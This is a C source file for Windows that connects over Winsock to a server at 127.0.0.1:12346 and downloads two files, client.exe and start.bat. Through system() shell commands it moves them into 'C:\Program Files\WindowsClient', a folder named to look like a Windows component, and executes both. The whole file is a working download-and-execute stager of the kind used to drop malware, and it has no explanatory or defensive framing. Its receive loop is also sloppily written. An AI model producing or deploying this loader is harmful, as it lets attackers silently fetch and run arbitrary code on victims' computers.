#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>


#pragma comment(lib, "ws2_32.lib")

#define PORT 12346

int main(int argc, char *argv[]) {
    WSADATA wsa;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in serv_addr;
    char *file1 = "client.exe";
    char *file2 = "start.bat";
    char buffer[200000] = {0};

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        printf("WSAStartup failed: %d\n", WSAGetLastError());
        return 1;
    }

    // Create socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("Socket creation error: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    // Set server address and port
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    // Convert IPv4 and IPv6 addresses from text to binary form
    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) {
        printf("Invalid address/ Address not supported\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Connect to server
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == SOCKET_ERROR) {
        printf("Connection failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    send(sock, file1, strlen(file1), 0);
    FILE* fp = fopen(file1, "wb");
    while(1){
        int rb = recv(sock, buffer, sizeof(buffer), 0);
        if (strncmp(buffer, "EOF",3) == 0) {
            break;
        }
        fwrite(buffer, 1, rb, fp);
        send(sock, "OK", sizeof("OK"), 0);
    }
    fclose(fp);
    printf("File %s received successfully\n", file1);
    
    send(sock, file2, strlen(file2), 0);
    fp = fopen(file2, "wb");
    while(1){
        int rb = recv(sock, buffer, sizeof(buffer), 0);
        if (strncmp(buffer, "EOF",3) == 0) {
            break;
        }
        fwrite(buffer, 1, rb, fp);
        send(sock, "OK", sizeof("OK"), 0);
    }
    fclose(fp);
    printf("File %s received successfully\n", file2);


    //create directory C:\Program Files\WindowsClient
    char *dir = "mkdir \"C:\\Program Files\\WindowsClient\"";
    system(dir);

    //code to move files to C:\Program Files\WindowsClient
    char *file1_path = "C:\\Program Files\\WindowsClient\\client.exe";
    char *file2_path = "C:\\Program Files\\WindowsClient\\start.bat";
    char *file1_move = "move client.exe \"C:\\Program Files\\WindowsClient\\client.exe\"";
    char *file2_move = "move start.bat \"C:\\Program Files\\WindowsClient\\start.bat\"";
    system(file1_move);
    system(file2_move);
    printf("Files moved successfully\n");
    
    //code to run start.bat
    char *file2_run = "start C:\\\"Program Files\"\\WindowsClient\\start.bat";
    system(file2_run);
    printf("Bat started successfully\n");
    
    //code to run client.exe
    char *file1_run = "start C:\\\"Program Files\"\\WindowsClient\\client.exe";
    system(file1_run);

    return 0;
}
